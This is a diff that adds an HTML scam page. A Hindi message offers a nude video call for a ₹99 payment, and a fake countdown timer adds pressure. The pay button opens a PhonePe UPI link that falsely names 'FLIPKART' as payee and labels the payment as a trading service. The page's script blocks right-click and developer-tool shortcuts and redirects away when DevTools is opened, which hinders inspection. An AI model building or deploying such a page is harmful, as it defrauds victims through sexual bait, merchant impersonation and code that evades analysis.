@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Offer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            background-color: #065c39;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-weight: bold;
+        }
+
+        .price {
+            text-align: center;
+            background: #d4f8d4;
+            padding: 15px 0;
+            font-size: 24px;
+            font-weight: bold;
+            color: #00a541;
+            background: radial-gradient(circle, #00a541 0%, #028a34 100%);
+            color: white;
+            border-radius: 30px;
+            margin: 10px auto;
+            width: 150px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .offer-timer {
+            background: #f54a4a;
+            color: white;
+            text-align: center;
+            padding: 8px;
+            font-weight: bold;
+        }
+
+        .message {
+            background: #d4f8d4;
+            margin: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .payment-option-big {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 20px;
+            margin: 15px;
+            background: linear-gradient(135deg, #6c2dc7, #8e44ad);
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(108, 45, 199, 0.4);
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .payment-option-big:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(108, 45, 199, 0.6);
+        }
+
+        .payment-option-big img {
+            width: 40px;
+            height: 40px;
+            background: white;
+            padding: 5px;
+            border-radius: 50%;
+        }
+
+        .payment-option-big span {
+            flex-grow: 1;
+            margin-left: 15px;
+        }
+
+        .arrow {
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+
+        .arrow {
+            font-size: 18px;
+            color: #888;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            padding: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="/assets/Forex-Trader-photo.jpg" width="100%" />
+        <div class="header">Special Offer Only For Today</div>
+        <div class="price">₹99 Only</div>
+        <div class="offer-timer">⏳ Offer ends in: 03:50</div>
+        <div class="message">
+            Sirf 99rs ka recharge kar ke ajao video call pe sab dikhaungi kapde khol ke
+        </div>
+
+        <div class="payment-option-big" onclick="makePayment()">
+            <img src="/assets/phonepe_logo.png" alt="PhonePe">
+            <span>Pay with PhonePe</span>
+            <div class="arrow">›</div>
+        </div>
+
+        <div class="footer">Limited time offer. Terms and conditions apply.</div>
+    </div>
+</body>
+<script>
+    // Disable right-click context menu
+    document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+    // Disable common DevTools shortcuts
+    document.addEventListener("keydown", (e) => {
+        if (
+            e.key === "F12" ||
+            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+            (e.ctrlKey && e.key === "U")
+        ) {
+            e.preventDefault();
+        }
+    });
+
+    // Detect if DevTools is open
+    (function () {
+        const element = new Image();
+        Object.defineProperty(element, 'id', {
+            get: function () {
+                window.location.href = "about:blank"; // Redirect or close
+            }
+        });
+        setInterval(() => {
+            console.log(element);
+            console.clear();
+        }, 1000);
+    })();
+    function makePayment() {
+        try {
+            const phonePeUrl = `phonepe://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04`;
+            window.location.href = phonePeUrl;
+        } catch (err) {
+            console.log(err)
+            alert(err)
+        }
+    }
+</script>
+
+</html>
